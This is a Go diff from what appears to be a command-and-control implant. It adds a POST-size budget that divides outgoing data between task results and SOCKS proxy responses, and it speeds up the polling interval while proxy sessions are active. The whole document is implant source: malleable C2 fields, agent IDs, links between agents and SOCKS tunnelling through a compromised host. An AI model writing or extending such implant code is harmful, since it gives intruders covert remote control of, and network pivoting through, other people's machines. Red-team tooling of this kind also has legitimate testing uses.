@@ -84,6 +84,7 @@ var (
 	MALLEABLE_ROUTING_ID_FIELD          = "r"
 	MALLEABLE_PAYLOAD_FIELD             = "p"
 	MALLEABLE_SOCKS_RESP_FIELD          = "sr"
+	MALLEABLE_MAX_POST_BYTES            = "0"
 )
 
 // SyncConfig holds the configuration for polling behavior
@@ -652,7 +653,7 @@ func startPolling(config SyncConfig, sysInfo *NR) error {
 			}
 
 			if hasActiveSocksSessions() {
-				nextInterval = time.Duration(1500+r.Intn(1000)) * time.Millisecond
+				nextInterval = time.Duration(500+r.Intn(1000)) * time.Millisecond
 			}
 
 			// Collect link data from connected TCP agents (if any)
@@ -672,7 +673,20 @@ func startPolling(config SyncConfig, sysInfo *NR) error {
 			hasUnlinkNotifications := len(unlinkNotifications) > 0
 
 			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications || hasSocksResp {
-				results := resultManager.getPendingResults()
+				maxPost, _ := strconv.Atoi(MALLEABLE_MAX_POST_BYTES)
+				resultBudget := 0
+				socksBudget := 0
+				if maxPost > 0 {
+					overhead := 8192
+					avail := maxPost - overhead
+					if avail < 1024 {
+						avail = 1024
+					}
+					resultBudget = avail * 60 / 100
+					socksBudget = avail - resultBudget
+				}
+
+				results := resultManager.getPendingResults(resultBudget)
 				payload := make(map[string]interface{})
 				payload[getPollStr(idxPollAgentId)] = getClientID()
 
@@ -683,14 +697,13 @@ func startPolling(config SyncConfig, sysInfo *NR) error {
 					payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 				}
 				if hasLinkHandshake {
-					// Send handshake as single object via "lh" field
 					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.toMalleableMap()
 				}
 				if hasUnlinkNotifications {
 					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
 				}
 				if hasSocksResp {
-					socksResp := GetSocksHTTPResponses()
+					socksResp := GetSocksHTTPResponsesBudgeted(socksBudget)
 					if len(socksResp) > 0 {
 						payload[MALLEABLE_SOCKS_RESP_FIELD] = socksResp
 					}
